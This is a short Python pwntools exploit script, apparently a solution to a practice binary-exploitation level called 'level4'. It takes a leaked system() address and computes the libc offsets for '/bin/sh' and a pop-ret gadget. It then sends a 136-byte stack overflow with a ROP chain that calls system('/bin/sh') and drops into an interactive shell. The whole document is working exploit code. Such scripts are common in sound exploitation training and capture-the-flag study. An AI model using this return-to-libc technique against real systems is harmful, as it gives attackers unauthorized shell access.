#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so.6')

p = process('./level4')
#p = remote('127.0.0.1',10001)


binsh_addr_offset = next(libc.search('/bin/sh')) -libc.symbols['system']
print "binsh_addr_offset = " + hex(binsh_addr_offset)

pop_ret_offset = 0x0000000000022a12 - libc.symbols['system']
print "pop_ret_offset = " + hex(pop_ret_offset)

#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols['system']
#print "pop_pop_call_offset = " + hex(pop_pop_call_offset)

print "\n##########receiving system addr##########\n"
system_addr_str = p.recvuntil('\n')
system_addr = int(system_addr_str,16)
print "system_addr = " + hex(system_addr)

binsh_addr = system_addr + binsh_addr_offset
print "binsh_addr = " + hex(binsh_addr)


pop_ret_addr = system_addr + pop_ret_offset
print "pop_ret_addr = " + hex(pop_ret_addr)

#pop_pop_call_addr = system_addr + pop_pop_call_offset
#print "pop_pop_call_addr = " + hex(pop_pop_call_addr)

p.recv()

payload = "\x00"*136 + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) 

#payload = "\x00"*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) 

print "\n##########sending payload##########\n"
p.send(payload)

p.interactive()

